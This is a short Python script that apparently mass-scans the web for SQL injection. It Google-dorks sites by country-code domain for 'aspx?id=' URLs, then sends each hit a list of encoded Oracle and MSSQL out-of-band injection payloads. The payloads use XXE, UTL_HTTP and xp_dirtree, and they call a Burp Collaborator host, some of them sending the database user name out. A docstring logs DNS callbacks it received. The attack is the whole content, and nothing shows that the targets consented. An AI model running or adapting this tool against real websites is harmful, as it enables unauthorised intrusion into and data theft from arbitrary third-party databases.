from redteam import RedTeam
import requests

"""
from burpcollaborator client:

1	2021-Oct-15 06:37:34 UTC	DNS	1bdfq8rj3r6zs9dx9g4idi6kkbqde2	
2	2021-Oct-15 06:37:34 UTC	DNS	1bdfq8rj3r6zs9dx9g4idi6kkbqde2	
3	2021-Oct-15 06:37:34 UTC	DNS	1bdfq8rj3r6zs9dx9g4idi6kkbqde2	

"""

sqli_payloads_oast = [

'(select%20extractvalue(xmltype(\'%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fppja%20SYSTEM%20%22http%3a%2f%2fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollab\'%7c%7c\'orator.net%2f%22%3e%25fppja%3b]%3e\')%2c\'%2fl\')%20from%20dual)',
'\'%7c%7c(select%20extractvalue(xmltype(\'%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fppja%20SYSTEM%20%22http%3a%2f%2fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollab\'%7c%7c\'orator.net%2f%22%3e%25fppja%3b]%3e\')%2c\'%2fl\')%20from%20dual)%7c%7c\'',
'%7C%7CUTL_HTTP.request%28%27http%3A%2F%2Fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollaborator.net%2F%27%29%20--%20',
'%7C%7CUTL_HTTP.request%28%27http%3A%2F%2Fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollaborator.net%2F%27%29%20%7C%7C',
'%7C%7CUTL_HTTP.request%28%27http%3A%2F%2Fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollaborator.net%2F%27%7C%7C%28SELECT%20user%20FROM%20DUAL%29%29%20--',
'%7C%7CUTL_HTTP.request%28%27http%3A%2F%2Fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollaborator.net%2F%27%7C%7C%28SELECT%20user%20FROM%20DUAL%29%29%20%7C%7C',
'%7c%7c(select%20extractvalue(xmltype(\'%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fppja%20SYSTEM%20%22http%3a%2f%2fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollab\'%7c%7c\'orator.net%2f%22%3e%25fppja%3b]%3e\')%2c\'%2fl\')%20from%20dual)%20--',
'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d\'%5c%5c1bdfq8rj3r6zs9dx9g4idi6kkbqde2.burpcollab\'%2b\'orator.net%5ckls\'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20',
'\'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d\'%5c%5c1bdfq8rj3r6zs9dx9g4idi6kkbqde2.burpcollab\'%2b\'orator.net%5cgpv\'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20',
')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d\'%5c%5c1bdfq8rj3r6zs9dx9g4idi6kkbqde2.burpcollab\'%2b\'orator.net%5cult\'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20',
'\')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d\'%5c%5c1bdfq8rj3r6zs9dx9g4idi6kkbqde2.burpcollab\'%2b\'orator.net%5czeb\'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20'

]

x = RedTeam()
cctlds = []

for cctld in cctlds:
        hits = x.googledork("site:*."+cctld+" inurl:aspx?id=")
        for hit in hits:
                try:
                        for sqli in sqli_payloads_oast:
                                requests.get(hit+sqli,verify=False,timeout=5)
                                print(hit+sqli)
                except (requests.exceptions.ConnectionError,requests.exceptions.Timeout,requests.exceptions.InvalidSchema):
                        pass
